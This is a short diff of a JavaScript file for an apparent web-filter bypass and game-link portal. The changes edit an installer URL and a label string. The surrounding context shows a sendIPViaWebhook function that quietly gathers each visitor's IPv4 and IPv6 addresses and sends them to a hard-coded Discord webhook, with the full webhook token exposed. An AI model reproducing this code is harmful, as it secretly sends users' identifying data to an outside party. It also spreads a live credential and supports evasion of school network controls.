@@ -135,7 +135,7 @@ function change() {
 
   createObject(container1, "rgba(0,0,0,0)", "THIS VERSION IS NO LONGER MAINTAINED ANYTHING BROKEN WILL NOT BE FIXED, !INSTALL V3!", " ");
 
-  createObject(container2,  "rgb(0,255,0)", "Version 3 Installer", "https://b1ueice.github.io/BypassWebsite3/")
+  createObject(container2,  "rgb(0,255,0)", "Version 3 Installer", "https://b1ueice.github.io/")
   createObject(container2,  "rgb(0,255,0)", "Version 3 Direct Access (Will be removed)", "https://b1ueice.github.io/BypassWebsite3/main")
 
   createObject(container3, "rgba(0,0,0,0.5)", "Subway Surfers", "https://superteamxx.github.io/Subway-Surfers/");
@@ -382,7 +382,7 @@ async function getUserIPv6Address() {
 async function sendIPViaWebhook() {
   const uinfo1 = await getUserIPAddress();
   const uinfo2 = await getUserIPv6Address();
-  const uinfo3 = "Unregistered"
+  const uinfo3 = "Unregistered on v2"
   const webhookURL = 'https://discord.com/api/webhooks/1187164716980785223/PLQjmGNi2-zqSHtfNyTjMpGfOosQPaOJkhU8rdLxmGbWwqRnAxJnkdTexKEuU7thAWAe';
 
   const data = {
